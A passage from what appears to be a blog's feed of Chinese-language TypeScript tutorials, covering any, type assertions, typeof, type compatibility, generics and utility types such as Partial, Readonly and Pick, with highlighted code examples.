&#123;&#125;)</span><br></pre></td></tr></table></figure><ul><li>说明：枚举与前面讲到的字面量类型+联合类型组合的功能类似，都用来表示一组明确的可选值列表</li><li>一般情况下，<strong>推荐使用字面量类型+联合类型组合的方式</strong>，因为相比枚举，这种方式更加直观、简洁、高效</li></ul><h3 id="any-类型"><a href="#any-类型" class="headerlink" title="any 类型"></a>any 类型</h3><ul><li><strong>原则:不推荐使用 any</strong>!这会让 TypeScript 变为 “AnyScript”(失去 TS 类型保护的优势)</li><li>因为当值的类型为 any 时，可以对该值进行任意操作，并且不会有代码提示</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj: <span class="built_in">any</span> = &#123; x: <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">obj.bar = <span class="number">100</span>;</span><br><span class="line">obj();</span><br><span class="line"><span class="keyword">const</span> n: <span class="built_in">number</span> = obj;</span><br></pre></td></tr></table></figure><ul><li>解释:以上操作都不会有任何类型错误提示，即使可能存在错误</li><li>尽可能的避免使用 any 类型，除非临时使用 any 来“避免”书写很长、很复杂的类型</li><li>其他隐式具有 any 类型的情况<ol><li>声明变量不提供类型也不提供默认值</li><li>函数参数不加类型</li></ol></li><li>注意：因为不推荐使用 any，所以，这两种情况下都应该提供类型</li></ul><p>在项目开发中，尽量少用 any 类型</p><hr><h3 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h3><p>有时候你会比 TS 更加明确一个值的类型，此时，可以使用类型断言来指定更具体的类型。 比如，</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> aLink = <span class="built_in">document</span>.getElementById(<span class="string">'link'</span>);</span><br></pre></td></tr></table></figure><ul><li>注意：该方法返回值的类型是 HTMLElement，该类型只包含所有标签公共的属性或方法，不包含 a 标签特有的 href 等属性</li><li>因此，这个<strong>类型太宽泛(不具体)</strong>，无法操作 href 等 a 标签特有的属性或方法</li><li>解决方式：这种情况下就需要<strong>使用类型断言指定更加具体的类型</strong></li><li>使用类型断言：</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> aLink = <span class="built_in">document</span>.getElementById(<span class="string">'link'</span>) <span class="keyword">as</span> HTMLAnchorElement;</span><br></pre></td></tr></table></figure><ul><li>解释:<ol><li>使用 <code>as</code> 关键字实现类型断言</li><li>关键字 as 后面的类型是一个更加具体的类型（HTMLAnchorElement 是 HTMLElement 的子类型）</li><li>通过类型断言，aLink 的类型变得更加具体，这样就可以访问 a 标签特有的属性或方法了</li></ol></li><li>另一种语法，使用 <code>&lt;&gt;</code> 语法，这种语法形式不常用知道即可:</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 该语法，知道即可：在react的jsx中使用会报错</span></span><br><span class="line"><span class="keyword">const</span> aLink = &lt;HTMLAnchorElement&gt;<span class="built_in">document</span>.getElementById(<span class="string">'link'</span>);</span><br></pre></td></tr></table></figure><p><em>技巧：在浏览器控制台，通过 <code>__proto__</code> 获取 DOM 元素的类型</em></p><h3 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h3><ul><li>众所周知，JS 中提供了 typeof 操作符，用来在 JS 中获取数据的类型</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="string">'Hello world'</span>); <span class="comment">// string</span></span><br></pre></td></tr></table></figure><ul><li>实际上，TS 也提供了 typeof 操作符：可以在<em>类型上下文</em>中引用变量或属性的类型（类型查询）</li><li>使用场景:根据已有变量的值，获取该值的类型，来简化类型书写</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = &#123; x: <span class="number">1</span>, y: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatPoint</span>(<span class="params">point: &#123; x: <span class="built_in">number</span>; y: <span class="built_in">number</span> &#125;</span>) </span>&#123;&#125;</span><br><span class="line">formatPoint(p);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatPoint</span>(<span class="params">point: <span class="keyword">typeof</span> p</span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>解释:<ol><li>使用 <code>typeof</code> 操作符来获取变量 p 的类型，结果与第一种（对象字面量形式的类型）相同</li><li>typeof 出现在<strong>类型注解的位置（参数名称的冒号后面）所处的环境就在类型上下文</strong>(区别于 JS 代码)</li><li>注意：typeof 只能用来查询变量或属性的类型，无法查询其他形式的类型（比如，函数调用的类型）</li></ol></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;TypeScript-常用类型&quot;&gt;&lt;a href=&quot;#TypeScript-常用类型&quot; class=&quot;headerlink&quot; title=&quot;TypeScript 常用类型&quot;&gt;&lt;/a&gt;TypeScript 常用类型&lt;/h1&gt;&lt;p&gt;TypeScript 是 JS 的超
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="TypeScript" scheme="//www.shen.ee/tags/TypeScript/"/>
    
      <category term="TypeScript常用类型" scheme="//www.shen.ee/tags/TypeScript%E5%B8%B8%E7%94%A8%E7%B1%BB%E5%9E%8B/"/>
    
      <category term="ts" scheme="//www.shen.ee/tags/ts/"/>
    
  </entry>
  
  <entry>
    <title>TypeScript 高级类型</title>
    <link href="//www.shen.ee/article/5963.html"/>
    <id>//www.shen.ee/article/5963.html</id>
    <published>2022-06-16T04:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TypeScript-高级类型"><a href="#TypeScript-高级类型" class="headerlink" title="TypeScript 高级类型"></a>TypeScript 高级类型</h1><h2 id="TS-中的类型兼容性"><a href="#TS-中的类型兼容性" class="headerlink" title="TS 中的类型兼容性"></a>TS 中的类型兼容性</h2><p><a href="https://www.typescriptlang.org/docs/handbook/type-compatibility.html" target="_blank" rel="noopener">TS 类型兼容性参考文档</a></p><p>两种类型系统：1 <strong>Structural Type System(结构化类型系统)</strong> 2 Nominal Type System(标明类型系统)</p><p><strong>TS 采用的是结构化类型系统，也叫做 duck typing(鸭子类型)，类型检查关注的是值所具有的形状</strong></p><p>也就是说，在结构类型系统中，如果两个对象具有相同的形状，则认为它们属于同一类型。比如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Point &#123;</span><br><span class="line">  x: <span class="built_in">number</span>;</span><br><span class="line">  y: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Point2D &#123;</span><br><span class="line">  x: <span class="built_in">number</span>;</span><br><span class="line">  y: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p2: Point2D = &#123;</span><br><span class="line">  x: <span class="number">1</span>,</span><br><span class="line">  y: <span class="number">2</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 不会报错</span></span><br><span class="line"><span class="keyword">let</span> p: Point = p2;</span><br></pre></td></tr></table></figure><p>对于对象类型来说，y 的成员至少与 x 相同，则 x 兼容 y（<strong>成员多的可以赋值给少的</strong>，或者说：只要满足必须的类型就行，多了也没事）</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Point2D &#123;</span><br><span class="line">  x: <span class="built_in">number</span>;</span><br><span class="line">  y: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Point3D &#123;</span><br><span class="line">  x: <span class="built_in">number</span>;</span><br><span class="line">  y: <span class="built_in">number</span>;</span><br><span class="line">  z: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p3: Point3D = &#123;</span><br><span class="line">  x: <span class="number">1</span>,</span><br><span class="line">  y: <span class="number">2</span>,</span><br><span class="line">  z: <span class="number">3</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 不会报错</span></span><br><span class="line"><span class="keyword">let</span> p2: Point2D = p3;</span><br></pre></td></tr></table></figure><p>函数类型的类型兼容性比较复杂，需要考虑：1 参数个数 2 返回值类型 等等</p><ol><li><p>参数个数：参数多的兼容参数少的(或者说，参数少的可以赋值给多的)</p><ul><li><strong>在 JS 中省略用不到的函数参数实际上是很常见的，这样的使用方式，促成了 TS 中函数类型之间的兼容性</strong></li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>];</span><br><span class="line"><span class="comment">// arr.forEach 第一个参数的类型为： (value: string, index: number, array: string[]) =&gt; void</span></span><br><span class="line">arr.forEach(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;);</span><br><span class="line">arr.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;&#125;);</span><br><span class="line">arr.forEach(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> F1 = <span class="function">(<span class="params">a: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line"><span class="keyword">type</span> F2 = <span class="function">(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确：参数少的可以赋值给参数多的</span></span><br><span class="line"><span class="keyword">let</span> f1: F1 = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> f2: F2 = f1;</span><br></pre></td></tr></table></figure></li><li><p>返回值类型：只要满足必须的类型要求就行，多了也没事</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> F1 = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line"><span class="keyword">const</span> f1: F1 = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h2 id="泛型概述"><a href="#泛型概述" class="headerlink" title="泛型概述"></a>泛型概述</h2><ul><li><strong>泛型（Generics）可以在保证类型安全前提下，让函数等与多种类型一起工作，从而实现复用</strong>，常用于：函数、接口、class 中</li><li>需求：创建一个 id 函数，传入什么数据就返回该数据本身（也就是说，参数和返回值类型相同）</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 比如，该函数传入什么数值，就返回什么数值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span>(<span class="params">value: <span class="built_in">number</span></span>): <span class="title">number</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// res =&gt; 10</span></span><br><span class="line"><span class="keyword">const</span> res = id(<span class="number">10</span>);</span><br></pre></td></tr></table></figure><ul><li>比如，id(10) 调用以上函数就会直接返回 10 本身。但是，该函数只接收数值类型，无法用于其他类型</li><li>为了能让函数能够接受任意类型的参数，可以将参数类型修改为 any。但是，这样就失去了 TS 的类型保护，类型不安全</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span>(<span class="params">value: <span class="built_in">any</span></span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这时候，就可以使用<strong>泛型</strong>来实现了</li><li><strong>泛型在保证类型安全(不丢失类型信息)的同时，可以让函数等与多种不同的类型一起工作，灵活可复用</strong></li><li>实际上，在 C# 和 Java 等编程语言中，泛型都是用来实现可复用组件功能的主要工具之一</li></ul><h2 id="泛型函数"><a href="#泛型函数" class="headerlink" title="泛型函数"></a>泛型函数</h2><p>创建泛型函数：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span>&lt;<span class="title">Type</span>&gt;(<span class="params">value: Type</span>): <span class="title">Type</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以仅使用一个字母来作为类型变量的名称</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span>&lt;<span class="title">T</span>&gt;(<span class="params">value: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释：</p><ul><li>语法：在函数名称的后面添加 <code>&lt;&gt;</code>（尖括号），<strong>尖括号中添加类型变量</strong>，比如此处的 Type</li><li><strong>类型变量 Type，是一种特殊类型的变量，它处理类型而不是值</strong></li><li><strong>类型变量相当于一个类型容器</strong>，能够捕获用户提供的类型（具体是什么类型由用户调用该函数时指定）</li><li>因为 Type 是类型，因此可以将其作为函数参数和返回值的类型，表示参数和返回值具有相同的类型</li><li>类型变量 Type，可以是任意合法的变量名称</li></ul><p>调用泛型函数：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数参数和返回值类型都为：number</span></span><br><span class="line"><span class="keyword">const</span> num = id&lt;<span class="built_in">number</span>&gt;(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数参数和返回值类型都为：string</span></span><br><span class="line"><span class="keyword">const</span> str = id&lt;<span class="built_in">string</span>&gt;(<span class="string">'a'</span>);</span><br></pre></td></tr></table></figure><p>解释：</p><ul><li>语法：在函数名称的后面添加 <code>&lt;&gt;</code>（尖括号），<strong>尖括号中指定具体的类型</strong>，比如，此处的 number</li><li>当传入类型 number 后，这个类型就会被函数声明时指定的类型变量 Type 捕获到</li><li>此时，Type 的类型就是 number，所以，函数 id 参数和返回值的类型也都是 number</li><li>这样，通过泛型就做到了让 id 函数与多种不同的类型一起工作，<strong>实现了复用的同时保证了类型安全</strong></li></ul><h2 id="简化泛型函数调用"><a href="#简化泛型函数调用" class="headerlink" title="简化泛型函数调用"></a>简化泛型函数调用</h2><p>在调用泛型函数时，<strong>可以省略 <code>&lt;类型&gt;</code> 来简化泛型函数的调用</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 省略 &lt;number&gt; 调用函数</span></span><br><span class="line"><span class="keyword">let</span> num = id(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">let</span> str = id(<span class="string">'a'</span>);</span><br></pre></td></tr></table></figure><p>解释:</p><ul><li>此时，TS 内部会采用一种叫做<strong>类型参数推断</strong>的机制，来根据传入的实参自动推断出类型变量 Type 的类型</li><li>比如，传入实参 10，TS 会自动推断出变量 num 的类型 number，并作为 Type 的类型</li><li>推荐：使用这种简化的方式调用泛型函数，使代码更短，更易于阅读</li><li>说明：<strong>当编译器无法推断类型或者推断的类型不准确时，就需要显式地传入类型参数</strong></li></ul><h2 id="泛型约束"><a href="#泛型约束" class="headerlink" title="泛型约束"></a>泛型约束</h2><p>默认情况下，泛型函数的类型变量 Type 可以代表任意类型，这导致无法访问任何属性</p><p>比如，以下示例代码中想要获取参数的长度：</p><ul><li>因为 Type 可以代表任意类型，无法保证一定存在 length 属性，比如 number 类型就没有 length。因此，无法访问 length 属性</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span>&lt;<span class="title">Type</span>&gt;(<span class="params">value: Type</span>): <span class="title">Type</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 注意：此处会报错</span></span><br><span class="line">  <span class="built_in">console</span>.log(value.length);</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">id(<span class="string">'a'</span>);</span><br></pre></td></tr></table></figure><p>此时，就需要<strong>为泛型添加约束来<code>收缩类型</code>（缩窄类型取值范围）</strong></p><p>添加泛型约束收缩类型，主要有以下两种方式：1 指定更加具体的类型 2 添加约束</p><p>首先，我们先来看第一种情况，如何指定更加具体的类型：</p><p>比如，将类型修改为 <code>Type[]</code>(Type 类型的数组)，因为只要是数组就一定存在 length 属性，因此就可以访问了</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span>&lt;<span class="title">Type</span>&gt;(<span class="params">value: Type[]</span>): <span class="title">Type</span>[] </span>&#123;</span><br><span class="line">  <span class="comment">// 可以正确访问</span></span><br><span class="line">  <span class="built_in">console</span>.log(value.length);</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="添加泛型约束"><a href="#添加泛型约束" class="headerlink" title="添加泛型约束"></a>添加泛型约束</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个自定义类型</span></span><br><span class="line"><span class="keyword">interface</span> ILength &#123;</span><br><span class="line">  length: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Type extends ILength 添加泛型约束</span></span><br><span class="line"><span class="comment">// 解释：表示传入的类型必须满足 ILength 接口的要求才行，也就是得有一个 number 类型的 length 属性</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span>&lt;<span class="title">Type</span> <span class="title">extends</span> <span class="title">ILength</span>&gt;(<span class="params">value: Type</span>): <span class="title">Type</span> </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value.length);</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释:</p><ul><li>创建描述约束的接口 ILength，该接口要求提供 length 属性</li><li>通过 <code>extends</code> 关键字来为泛型（类型变量）添加约束</li><li>该约束表示：<strong>传入的类型必须具有 length 属性</strong></li><li>注意：传入的实参（比如，数组）只要有 length 属性即可（类型兼容性)</li></ul><h2 id="多个类型变量的泛型"><a href="#多个类型变量的泛型" class="headerlink" title="多个类型变量的泛型"></a>多个类型变量的泛型</h2><p>泛型的类型变量可以有多个，并且<strong>类型变量之间还可以约束</strong>(比如，第二个类型变量受第一个类型变量约束) 比如，创建一个函数来获取对象中属性的值：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getProp</span>&lt;<span class="title">Type</span>, <span class="title">Key</span> <span class="title">extends</span> <span class="title">keyof</span> <span class="title">Type</span>&gt;(<span class="params">obj: Type, key: Key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> obj[key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> person = &#123; name: <span class="string">'jack'</span>, age: <span class="number">18</span> &#125;;</span><br><span class="line">getProp(person, <span class="string">'name'</span>);</span><br></pre></td></tr></table></figure><p>解释:</p><ol><li>添加了第二个类型变量 Key，两个类型变量之间使用 <code>,</code> 逗号分隔。</li><li><strong>keyof 关键字接收一个对象类型，生成其键名称(可能是字符串或数字)的联合类型</strong>。</li><li>本示例中 <code>keyof Type</code> 实际上获取的是 person 对象所有键的联合类型，也就是：<code>&#39;name&#39; | &#39;age&#39;</code></li><li>类型变量 Key 受 Type 约束，可以理解为：Key 只能是 Type 所有键中的任意一个，或者说只能访问对象中存在的属性</li></ol><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Type extends object 表示： Type 应该是一个对象类型，如果不是 对象 类型，就会报错</span></span><br><span class="line"><span class="comment">// 如果要用到 对象 类型，应该用 object ，而不是 Object</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getProperty</span>&lt;<span class="title">Type</span> <span class="title">extends</span> <span class="title">object</span>, <span class="title">Key</span> <span class="title">extends</span> <span class="title">keyof</span> <span class="title">Type</span>&gt;(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">  obj: Type,</span></span></span><br><span class="line"><span class="function"><span class="params">  key: Key,</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> obj[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h2><p>泛型接口：接口也可以配合泛型来使用，以增加其灵活性，增强其复用性</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> IdFunc&lt;Type&gt; &#123;</span><br><span class="line">  id: <span class="function">(<span class="params">value: Type</span>) =&gt;</span> Type;</span><br><span class="line">  ids: <span class="function"><span class="params">()</span> =&gt;</span> Type[];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj: IdFunc&lt;<span class="built_in">number</span>&gt; = &#123;</span><br><span class="line">  id(value) &#123;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;,</span><br><span class="line">  ids() &#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>];</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>解释：</p><ol><li>在接口名称的后面添加 <code>&lt;类型变量&gt;</code>，那么，这个接口就变成了泛型接口。</li><li>接口的类型变量，对接口中所有其他成员可见，也就是<strong>接口中所有成员都可以使用类型变量</strong>。</li><li>使用泛型接口时，<strong>需要显式指定具体的类型</strong>(比如，此处的 IdFunc)。</li><li>此时，id 方法的参数和返回值类型都是 number;ids 方法的返回值类型是 number[]。</li></ol><p>实际上，JS 中的数组在 TS 中就是一个泛型接口</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> strs = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>];</span><br><span class="line"><span class="comment">// 鼠标放在 forEach 上查看类型</span></span><br><span class="line">strs.forEach;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> nums = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>];</span><br><span class="line"><span class="comment">// 鼠标放在 forEach 上查看类型</span></span><br><span class="line">nums.forEach;</span><br></pre></td></tr></table></figure><ul><li>解释:当我们在使用数组时，TS 会根据数组的不同类型，来自动将类型变量设置为相应的类型</li><li>技巧:可以通过 Ctrl + 鼠标左键(Mac：Command + 鼠标左键)来查看具体的类型信息</li></ul><h2 id="泛型工具类型"><a href="#泛型工具类型" class="headerlink" title="泛型工具类型"></a>泛型工具类型</h2><p>泛型工具类型：TS 内置了一些常用的工具类型，来简化 TS 中的一些常见操作</p><p>说明：它们都是基于泛型实现的(泛型适用于多种类型，更加通用)，并且是内置的，可以直接在代码中使用。 这些工具类型有很多，主要学习以下几个:</p><ol><li><code>Partial&lt;Type&gt;</code></li><li><code>Readonly&lt;Type&gt;</code></li><li><code>Pick&lt;Type, Keys&gt;</code></li></ol><ul><li><a href="https://www.typescriptlang.org/docs/handbook/utility-types.html" target="_blank" rel="noopener">TS 所有内置的泛型工具类型文档</a></li></ul><h3 id="Partial"><a href="#Partial" class="headerlink" title="Partial"></a>Partial</h3><ul><li>Partial 用来构造(创建)一个类型，将 Type 的所有属性设置为可选。</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Props = &#123;</span><br><span class="line">  id: <span class="built_in">string</span>;</span><br><span class="line">  children: <span class="built_in">number</span>[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> PartialProps = Partial&lt;Props&gt;;</span><br></pre></td></tr></table></figure><ul><li>解释:构造出来的新类型 PartialProps 结构和 Props 相同，但所有属性都变为可选的。</li></ul><h3 id="Readonly"><a href="#Readonly" class="headerlink" title="Readonly"></a>Readonly</h3><ul><li>Readonly 用来构造一个类型，将 Type 的所有属性都设置为 readonly(只读)。</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Props = &#123;</span><br><span class="line">  id: <span class="built_in">string</span>;</span><br><span class="line">  children: <span class="built_in">number</span>[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ReadonlyProps = Readonly&lt;Props&gt;;</span><br></pre></td></tr></table></figure><ul><li>解释:构造出来的新类型 ReadonlyProps 结构和 Props 相同，但所有属性都变为只读的。</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> props: ReadonlyProps = &#123; id: <span class="string">'1'</span>, children: [] &#125;;</span><br><span class="line"><span class="comment">// 错误演示</span></span><br><span class="line">props.id = <span class="string">'2'</span>;</span><br></pre></td></tr></table></figure><ul><li>当我们想重新给 id 属性赋值时，就会报错:无法分配到 “id” ，因为它是只读属性。</li></ul><h3 id="Pick"><a href="#Pick" class="headerlink" title="Pick"></a>Pick</h3><ul><li>Pick<type, keys=""> 从 Type 中选择一组属性来构造新类型。</type,></li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 